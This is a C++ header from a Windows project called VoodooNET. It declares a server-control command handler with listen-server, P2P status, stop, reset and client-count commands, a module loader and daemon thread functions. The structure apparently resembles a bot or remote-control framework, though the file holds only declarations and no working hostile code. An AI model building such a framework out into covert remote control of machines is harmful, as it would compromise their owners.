/*
 *  VoodooNET - a modular multi-threaded program for Windows x86/x64 bit
 *	Coded by VoRTeCKZ - @therealvorteckz
 *  VoRTeCKZ Studios
 *
 *	Copyright (C) 2023 - All Rights Reserved.
 *
 * Permission to ("use, copy, and/or modify") this software for
 * any purpose  with or without fee is hereby granted, provided that the above copyright
 * notice and this permission notice appear in all copies.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED,
 * INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR
 * PURPOSE AND NONINFRINGEMENT OF THIRD PARTY RIGHTS. IN NO EVENT SHALL THE AUTHORS OR
 * COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN
 * ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE
 * SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 *
 */
 

#pragma once
#ifndef __CSERVERCONTROL_h__
#define __CSERVERCONTROL_h__
//#include "includes.h"
// 
#include "cCommands.h"
#include "cServer.h"

class cServerControl : public cCommandHandler
{
public:
	cServerControl();
	~cServerControl();

	bool HandleCommand(char* cmd, char* params, ...);
	void Init();
	void StartDaemon();
	command m_cmdListenServer;
	command m_cmdP2PStatus;
	command m_cmdP2PStop;
	command m_cmdP2PClientsCalc;
	command m_cmddebug;
	command m_cmdP2PReset;
	
	moduload m_cServerControlP2P;

};
DWORD WINAPI ServerDaemonThread(LPVOID param);
DWORD WINAPI ENDP2P(LPVOID param);

DWORD WINAPI RESETP2P(LPVOID param);
#endif
